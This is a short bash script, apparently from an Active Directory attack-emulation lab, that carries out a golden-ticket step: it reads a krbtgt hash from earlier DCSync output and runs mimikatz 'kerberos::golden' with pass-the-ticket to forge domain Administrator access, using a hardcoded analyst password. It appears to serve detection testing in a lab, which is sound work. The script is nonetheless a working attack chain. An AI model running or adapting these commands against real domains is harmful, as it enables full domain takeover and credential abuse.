#!/usr/bin/env bash
# T010 — Golden ticket from ws01 (post T009 krbtgt hash on ws01)
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T010-GOLDEN-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T010 | ${CASE_ID} | T0=${T0} ==="

ws01_ensure_mimikatz

# Domain SID cadre.local from lab (stable per deploy)
DOMAIN_SID="S-1-5-21-3865287775-2509525290-3994641269"

ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  "\$h=(Select-String -Path C:\Tools\cadre-attack\dcsync-out.txt -Pattern 'krbtgt.*aes256' | Select-Object -First 1).Line; if (-not \$h) { \$h=(Select-String -Path C:\Tools\cadre-attack\dcsync-out.txt -Pattern 'krbtgt' | Select-Object -First 1).Line }; Write-Output \"HASHLINE:\$h\"; \$aes=(\$h -split ':')[-1]; C:\Tools\cadre-attack\mimikatz.exe \"kerberos::golden /user:Administrator /domain:cadre.local /sid:${DOMAIN_SID} /aes256:\$aes /ptt\" \"misc::cmd cmd.exe /c whoami\" exit"

cadre_export "${CASE_ID}" T010 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
